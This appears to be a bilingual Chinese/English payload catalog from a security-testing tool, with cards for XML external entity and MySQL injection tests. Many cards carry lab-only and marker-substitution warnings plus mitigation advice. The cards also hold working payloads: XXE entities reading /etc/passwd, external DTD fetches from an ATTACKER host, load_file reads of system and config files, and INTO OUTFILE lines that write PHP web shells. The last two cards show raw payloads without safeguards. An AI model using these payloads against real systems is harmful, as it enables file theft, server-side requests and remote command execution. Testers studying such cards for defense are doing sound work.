description.zh: 记录实际入口、解析组件、版本和无外部资源基线。
description.en: Record the actual entry, parser component, version, and no-external-resource baseline.

title.zh: 改写目标并运行一次
title.en: Rewrite the target and run once

description.zh: 只使用本条执行区命令，所有真实资源替换为隔离 marker。
description.en: Use only this execution command and replace every real resource with an isolated marker.

title.zh: 关联任务级证据

description.zh: 匹配 parser 事件、任务 token 与解析或派生输出，排除其他入口。
description.en: Match parser events, job token, and parsed or derived output and exclude other entries.

title.zh: 关闭外部能力并回归

description.zh: 修复后正常 XML 功能保持，该机制在访问 marker 前被拒绝。
description.en: After remediation preserve normal XML behavior and reject this mechanism before marker access.

analysis.zh: 阳性要求已识别通用 XML parser 的进程读取对应 marker 且值进入解析结果；路径文本、DOCTYPE 接受或 open 失败不是内容读取。
analysis.en: A positive requires the identified generic XML parser process to read the corresponding marker and place its value in parsed output; path text, accepted DOCTYPE, or failed open is not a content read.

name.zh: SVG 本地文件外部实体

description.zh: 隔离 SVG text 节点中的 file URI 实体，验证 SVG 图片处理 worker 的服务端实体展开。
description.en: Isolates a file-URI entity in an SVG text node to test server-side entity expansion by an SVG image worker.

title.zh: SVG 本地文件外部实体

execution.command: <?xml version="1.0" standalone="yes"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"><text font-size="16" x="0" y="16">&xxe;</text></svg>

description.zh: 将 `/etc/passwd` 改为图片 worker 沙箱中的随机 marker.txt，再触发一次预览或栅格任务。
description.en: Change /etc/passwd to random marker.txt in the image-worker sandbox and trigger one preview or raster job.

title.zh: 绑定格式与解析器
title.en: Bind the format to its parser

description.zh: 记录实际入口、解析组件、版本和无外部资源基线。
description.en: Record the actual entry, parser component, version, and no-external-resource baseline.

title.zh: 改写目标并运行一次
title.en: Rewrite the target and run once

description.zh: 只使用本条执行区命令，所有真实资源替换为隔离 marker。
description.en: Use only this execution command and replace every real resource with an isolated marker.

title.zh: 关联任务级证据

description.zh: 匹配 parser 事件、任务 token 与解析或派生输出，排除其他入口。
description.en: Match parser events, job token, and parsed or derived output and exclude other entries.

title.zh: 关闭外部能力并回归

description.zh: 修复后正常 XML 功能保持，该机制在访问 marker 前被拒绝。
description.en: After remediation preserve normal XML behavior and reject this mechanism before marker access.

analysis.zh: 阳性要求处理该 SVG 的 worker 读取 marker 并把值放入 SVG 模型或派生产物；客户端浏览器渲染或上传成功不计。
analysis.en: A positive requires the worker processing this SVG to read the marker and place its value in the SVG model or derived artifact; client rendering or upload success does not count.

name.zh: 通用 XML 外部 DTD 获取变体

description.zh: 归并两个远程参数实体 DTD 文件名变体，验证通用 XML parser 是否获取外部子集，不推断 DTD 后续内容。
description.en: Groups two remote parameter-entity DTD filename variants to test whether a generic XML parser retrieves an external subset without inferring later DTD content.

subCategory.zh: 通用 XML 外部参数实体

title.zh: 通用 XML 外部 DTD 获取变体

execution.command:
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/xxe.dtd">%xxe;]><root>test</root>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/xxe_gopher.dtd">%xxe;]><root>test</root>

description.zh: 把 ATTACKER 改为两个独立 token 路径，均只返回空合法 DTD；不得提供 gopher 或二次实体内容。
description.en: Replace ATTACKER with two independently tokenized paths returning empty valid DTDs only; provide no gopher or secondary-entity content.

title.zh: 绑定格式与解析器
title.en: Bind the format to its parser

description.zh: 记录实际入口、解析组件、版本和无外部资源基线。
description.en: Record the actual entry, parser component, version, and no-external-resource baseline.

title.zh: 改写目标并运行一次
title.en: Rewrite the target and run once

description.zh: 只使用本条执行区命令，所有真实资源替换为隔离 marker。
description.en: Use only this execution command and replace every real resource with an isolated marker.

title.zh: 关联任务级证据

description.zh: 匹配 parser 事件、任务 token 与解析或派生输出，排除其他入口。
description.en: Match parser events, job token, and parsed or derived output and exclude other entries.

title.zh: 关闭外部能力并回归

description.zh: 修复后正常 XML 功能保持，该机制在访问 marker 前被拒绝。
description.en: After remediation preserve normal XML behavior and reject this mechanism before marker access.

analysis.zh: 阳性仅证明目标 parser 发出了对应 token 的 DTD 请求；文件名含 gopher、DNS、客户端请求或错误不能证明后续协议访问。
analysis.en: A positive proves only that the target parser sent the matching DTD-token request; gopher in a filename, DNS, client requests, or errors do not prove a later protocol access.

name.zh: 通用 XML 元数据地址实体

description.zh: 隔离指向链路本地元数据地址的外部通用实体，验证通用 XML parser 的服务端 HTTP 请求边界。
description.en: Isolates an external general entity targeting a link-local metadata address to test server-side HTTP request behavior in a generic XML parser.

subCategory.zh: 通用 XML HTTP 外部实体

title.zh: 通用 XML 元数据地址实体

description.zh: 绝不访问真实元数据；将地址改为隔离模拟端点并只返回短随机 XML marker。
description.en: Never access real metadata; replace the address with an isolated simulator returning only a short random XML marker.

title.zh: 绑定格式与解析器
title.en: Bind the format to its parser

description.zh: 记录实际入口、解析组件、版本和无外部资源基线。
description.en: Record the actual entry, parser component, version, and no-external-resource baseline.

title.zh: 改写目标并运行一次
title.en: Rewrite the target and run once

description.zh: 只使用本条执行区命令，所有真实资源替换为隔离 marker。
description.en: Use only this execution command and replace every real resource with an isolated marker.

title.zh: 关联任务级证据

description.zh: 匹配 parser 事件、任务 token 与解析或派生输出，排除其他入口。
description.en: Match parser events, job token, and parsed or derived output and exclude other entries.

title.zh: 关闭外部能力并回归

description.zh: 修复后正常 XML 功能保持，该机制在访问 marker 前被拒绝。
description.en: After remediation preserve normal XML behavior and reject this mechanism before marker access.

analysis.zh: 阳性要求应用 parser 向模拟端点发送当前 token，若声称内容可读还必须让 marker 进入解析输出；URL、DNS 或连接错误不足。
analysis.en: A positive requires the application parser to send the current token to the simulator, and a readable-content claim additionally requires the marker in parsed output; a URL, DNS, or connection error is insufficient.

name.zh: SpreadsheetML 形态本地文件实体

description.zh: 隔离根元素为 sst 的无命名空间 XML 样例，验证实际接收该形态输入的 parser，而不把它误称为完整 XLSX 部件。
description.en: Isolates the namespace-free sst-root XML sample to test the parser that actually accepts this shape without mislabeling it as a complete XLSX part.

subCategory.zh: 表格形态 XML 外部实体

title.zh: SpreadsheetML 形态本地文件实体

execution.command: <?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><sst><si><t>&xxe;</t></si></sst>

description.zh: 在已确认的原始 XML 入口测试，把系统路径改为随机 marker；不得宣称该行本身是完整 XLSX。
description.en: Test at a confirmed raw-XML entry, change the system path to a random marker, and do not claim the line alone is a complete XLSX file.

title.zh: 绑定格式与解析器
title.en: Bind the format to its parser

description.zh: 记录实际入口、解析组件、版本和无外部资源基线。
description.en: Record the actual entry, parser component, version, and no-external-resource baseline.

title.zh: 改写目标并运行一次
title.en: Rewrite the target and run once

description.zh: 只使用本条执行区命令，所有真实资源替换为隔离 marker。
description.en: Use only this execution command and replace every real resource with an isolated marker.

title.zh: 关联任务级证据

description.zh: 匹配 parser 事件、任务 token 与解析或派生输出，排除其他入口。
description.en: Match parser events, job token, and parsed or derived output and exclude other entries.

title.zh: 关闭外部能力并回归

description.zh: 修复后正常 XML 功能保持，该机制在访问 marker 前被拒绝。
description.en: After remediation preserve normal XML behavior and reject this mechanism before marker access.

analysis.zh: 阳性要求实际 parser 读取 marker 并把值写入 sst/si/t 模型或提取输出；仅元素名像 SpreadsheetML 或解析错误不计。
analysis.en: A positive requires the actual parser to read the marker and place its value in the sst/si/t model or extracted output; SpreadsheetML-like names or parse errors do not count.

name.zh: 通用 XML PHP Expect 实体边界

description.zh: 隔离 expect:// 外部实体，验证 PHP/libxml 通用 XML 入口是否暴露 expect 扩展。
description.en: Isolates an expect:// external entity to test whether a generic PHP/libxml XML entry exposes the expect extension.

subCategory.zh: 通用 XML PHP Expect Wrapper

title.zh: 通用 XML PHP Expect 实体边界

description.zh: 绝不运行原始 id；只用无子进程测试 wrapper 返回当前任务 marker。
description.en: Never run the source id command; use only a no-child-process test wrapper that returns the current job marker.

title.zh: 绑定格式与解析器
title.en: Bind the format to its parser

description.zh: 记录实际入口、解析组件、版本和无外部资源基线。
description.en: Record the actual entry, parser component, version, and no-external-resource baseline.

title.zh: 改写目标并运行一次
title.en: Rewrite the target and run once

description.zh: 只使用本条执行区命令，所有真实资源替换为隔离 marker。
description.en: Use only this execution command and replace every real resource with an isolated marker.

title.zh: 关联任务级证据

description.zh: 匹配 parser 事件、任务 token 与解析或派生输出，排除其他入口。
description.en: Match parser events, job token, and parsed or derived output and exclude other entries.

title.zh: 关闭外部能力并回归

description.zh: 修复后正常 XML 功能保持，该机制在访问 marker 前被拒绝。
description.en: After remediation preserve normal XML behavior and reject this mechanism before marker access.

analysis.zh: 阳性要求无副作用测试 wrapper 在目标 PHP parser 进程内被调用；命令文本、scheme 识别或解析错误不能证明执行。
analysis.en: A positive requires the side-effect-free test wrapper to be invoked inside the target PHP parser process; command text, scheme recognition, or parse errors do not prove execution.

retiredCommands.command: <?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><w:document><w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body></w:document>

reason.zh: 该 WordprocessingML 形态行使用 w:document、w:body 等前缀却没有声明 xmlns:w，XML parser 会报 unbound prefix，无法到达实体解析或文件读取。
reason.en: This WordprocessingML-shaped line uses w:document, w:body, and related prefixes without declaring xmlns:w; an XML parser reports an unbound prefix before entity resolution or file access.

name.zh: MySQL FILE 权限可见性

description.zh: 将原混合条目中属于MySQL FILE 权限可见性的命令逐行独立路由，明确技术前提、权限、副作用和可复验证据边界。
description.en: Routes every source line belonging to MySQL FILE Privilege Visibility into one focused card with explicit technical prerequisites, privileges, side effects, and reproducible evidence boundaries.

prerequisites.zh: 仅在隔离实例确认MySQL FILE 权限可见性所需组件、版本、权限和语句位置，不把另一 DBMS 的语法错误当作证据。
prerequisites.en: Confirm the component, version, privileges, and statement position required by MySQL FILE Privilege Visibility in an isolated instance; syntax errors from another DBMS are not evidence.

prerequisites.zh: 准备专用 schema、固定 PAYLOADER_MARKER、数据库审计日志与可撤销权限；真实系统文件、生产账户和外部目标不得使用。
prerequisites.en: Prepare a dedicated schema, fixed PAYLOADER_MARKER, database audit logs, and revocable privileges; do not use real system files, production accounts, or external targets.

title.zh: MySQL FILE 权限可见性主验证命令
title.en: MySQL FILE Privilege Visibility Primary Validation

execution.command:
' UNION SELECT 1,file_priv,3 FROM mysql.user WHERE user=current_user()--
' AND (SELECT file_priv FROM mysql.user WHERE user=current_user())='Y'--

description.zh: 这些行按审校后的来源逐行守恒；执行前必须把真实账户、文件、网络目标和系统命令替换为隔离 marker，并只在授权实验环境运行。
description.en: These lines are conserved exactly from the reviewed source. Before execution, replace real accounts, files, network targets, and system commands with isolated markers and run only in an authorized lab.

overview.zh: MySQL FILE 权限可见性必须从原集合中独立判断，因为它有自己的语法、权限模型和副作用边界。命令按来源守恒，但只作为隔离实验输入。
overview.en: MySQL FILE Privilege Visibility must be evaluated independently because it has its own syntax, privilege model, and side-effect boundary. Source commands are conserved but remain isolated-lab inputs.

vulnerability.zh: 风险成立需要不可信输入到达MySQL FILE 权限可见性对应语句，并在同一请求中越过预期绑定或权限边界。仅出现关键字、错误、对象名或权限拒绝均不能证明能力。
vulnerability.en: A finding requires untrusted input to reach the MySQL FILE Privilege Visibility statement and cross the intended binding or privilege boundary in the same request. Keywords, errors, object names, or denied privileges alone do not prove capability.

exploitation.zh: 先重放固定 marker 的阴性与阳性对照，再逐行测试本卡命令；涉及文件、进程、日志、网络或配置的来源值必须替换为一次性沙箱 fixture，并在首个充分证据后停止。
exploitation.en: Replay fixed-marker negative and positive controls before testing each card line. Replace source values involving files, processes, logs, networks, or configuration with disposable sandbox fixtures and stop after the first sufficient proof.

mitigation.zh: 使用参数化查询和固定操作映射，撤销应用角色不需要的高权限包、文件、网络、配置与执行能力，并在数据库审计中告警异常动态 SQL。
mitigation.en: Use parameterized queries and fixed operation mappings, revoke unneeded package, file, network, configuration, and execution privileges from the application role, and alert on abnormal dynamic SQL in database audit logs.

title.zh: 限定MySQL FILE 权限可见性前提
title.en: Constrain MySQL FILE Privilege Visibility prerequisites

description.zh: 确认MySQL FILE 权限可见性对应的实现、版本、语句上下文、权限与隔离数据均已记录。
description.en: Record the implementation, version, statement context, privileges, and isolated data required by MySQL FILE Privilege Visibility.

title.zh: 提交MySQL FILE 权限可见性主命令
title.en: Submit the MySQL FILE Privilege Visibility primary command

description.zh: 仅提交 execution[0] 的审校命令组，并为本次请求绑定唯一 marker 与数据库审计标识。
description.en: Submit only the reviewed execution[0] command group and bind a unique marker and database audit identifier to the request.

title.zh: 关联MySQL FILE 权限可见性证据
title.en: Correlate MySQL FILE Privilege Visibility evidence

description.zh: 把同一 marker 的应用响应、最终 SQL、权限判定和数据库审计事件关联，排除回显、语法错误和其他分支。
description.en: Correlate the same marker across the application response, final SQL, privilege decision, and database audit event, excluding reflection, syntax errors, and other branches.

title.zh: 收敛MySQL FILE 权限可见性能力
title.en: Contain the MySQL FILE Privilege Visibility capability

description.zh: 撤销测试权限与临时对象，恢复参数化和最小权限配置，再重放阴性与正常业务基线。
description.en: Revoke test privileges and temporary objects, restore parameterization and least privilege, then replay negative and normal business baselines.

analysis.zh: MySQL FILE 权限可见性的阳性证据必须由同一 marker 的最终语句、权限和结果共同确认；字符串回显、解析失败、预存文件、手工控制台执行或其他技术分支均是假阳性。
analysis.en: Positive MySQL FILE Privilege Visibility evidence requires the final statement, privilege decision, and result for the same marker. Reflected strings, parse failures, preexisting files, manual console execution, or another technique branch are false positives.

opsecTips.zh: 出现生产数据、持久文件、真实外连、配置变化、锁等待、资源异常或非测试账户影响时立即停止。
opsecTips.en: Stop immediately on production data, persistent files, real egress, configuration changes, lock waits, resource anomalies, or impact to non-test accounts.

opsecTips.zh: 测试后回滚事务，删除临时 schema、marker、文件和日志目标，撤销临时权限并确认正常查询基线。
opsecTips.en: After testing, roll back transactions, remove temporary schemas, markers, files, and log targets, revoke temporary privileges, and confirm the normal-query baseline.

name.zh: MySQL 服务端文件读取边界

description.zh: 将原混合条目中属于MySQL 服务端文件读取边界的命令逐行独立路由，明确技术前提、权限、副作用和可复验证据边界。

title.en: MySQL Server-Side File Read Boundary Primary Validation

execution.command:
' UNION SELECT 1,@@basedir,3--
' UNION SELECT 1,@@datadir,3--
' UNION SELECT 1,load_file('/etc/passwd'),3--
' UNION SELECT 1,load_file('/etc/passwd'),3--
' UNION SELECT 1,load_file('/var/www/html/config.php'),3--
' UNION SELECT 1,load_file('C:/windows/win.ini'),3--

title.en: MySQL Server-Side File Write Boundary Primary Validation

execution.command:
' UNION SELECT 1,'<?php @eval($_POST[cmd]);?>',3 INTO OUTFILE '/var/www/html/shell.php'--
' UNION SELECT 1,'<?php system($_GET[c]);?>',3 INTO OUTFILE '/var/www/html/cmd.php'--
